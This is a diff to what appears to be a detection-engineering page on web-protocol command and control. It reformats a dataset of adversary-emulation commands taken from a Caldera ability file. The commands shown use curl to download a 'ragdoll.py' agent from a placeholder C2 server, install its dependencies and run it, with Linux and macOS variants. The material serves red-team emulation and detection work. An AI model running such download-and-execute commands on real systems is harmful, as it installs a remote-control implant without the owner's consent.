@@ -29,34 +29,31 @@ Adversaries may utilize many different protocols, including those used for web b
 ## Potential Commands
 
 ```
-{'darwin': {'sh': {'command': 'server="#{app.contact.http}";\ncurl -s -X POST -H "file:ragdoll.py" -H "platform:darwin" $server/file/download > ragdoll.py;\npip install requests beautifulsoup4;\npython ragdoll.py -W $server#{app.contact.html}\n', 'cleanup': 'pkill -f ragdoll\n'}}, 'linux': {'sh': {'command': 'server="#{app.contact.http}";\ncurl -s -X POST -H "file:ragdoll.py" -H "platform:linux" $server/file/download > ragdoll.py;\npip install requests beautifulsoup4;\npython ragdoll.py -W $server#{app.contact.html}\n', 'cleanup': 'pkill -f ragdoll\n'}}}
+server="#{app.contact.http}";
+curl -s -X POST -H "file:ragdoll.py" -H "platform:linux" $server/file/download > ragdoll.py;
+pip install requests beautifulsoup4;
+python ragdoll.py -W $server#{app.contact.html}
+server="#{app.contact.http}";
+curl -s -X POST -H "file:ragdoll.py" -H "platform:darwin" $server/file/download > ragdoll.py;
+pip install requests beautifulsoup4;
+python ragdoll.py -W $server#{app.contact.html}
 ```
 
 ## Commands Dataset
 
 ```
-[{'command': {'darwin': {'sh': {'cleanup': 'pkill -f ragdoll\n',
-                                'command': 'server="#{app.contact.http}";\n'
-                                           'curl -s -X POST -H '
-                                           '"file:ragdoll.py" -H '
-                                           '"platform:darwin" '
-                                           '$server/file/download > '
-                                           'ragdoll.py;\n'
-                                           'pip install requests '
-                                           'beautifulsoup4;\n'
-                                           'python ragdoll.py -W '
-                                           '$server#{app.contact.html}\n'}},
-              'linux': {'sh': {'cleanup': 'pkill -f ragdoll\n',
-                               'command': 'server="#{app.contact.http}";\n'
-                                          'curl -s -X POST -H '
-                                          '"file:ragdoll.py" -H '
-                                          '"platform:linux" '
-                                          '$server/file/download > '
-                                          'ragdoll.py;\n'
-                                          'pip install requests '
-                                          'beautifulsoup4;\n'
-                                          'python ragdoll.py -W '
-                                          '$server#{app.contact.html}\n'}}},
+[{'command': 'server="#{app.contact.http}";\n'
+             'curl -s -X POST -H "file:ragdoll.py" -H "platform:darwin" '
+             '$server/file/download > ragdoll.py;\n'
+             'pip install requests beautifulsoup4;\n'
+             'python ragdoll.py -W $server#{app.contact.html}\n',
+  'name': 'A Python agent which communicates via the HTML contact',
+  'source': 'data/abilities/command-and-control/0ab383be-b819-41bf-91b9-1bd4404d83bf.yml'},
+ {'command': 'server="#{app.contact.http}";\n'
+             'curl -s -X POST -H "file:ragdoll.py" -H "platform:linux" '
+             '$server/file/download > ragdoll.py;\n'
+             'pip install requests beautifulsoup4;\n'
+             'python ragdoll.py -W $server#{app.contact.html}\n',
   'name': 'A Python agent which communicates via the HTML contact',
   'source': 'data/abilities/command-and-control/0ab383be-b819-41bf-91b9-1bd4404d83bf.yml'}]
 ```
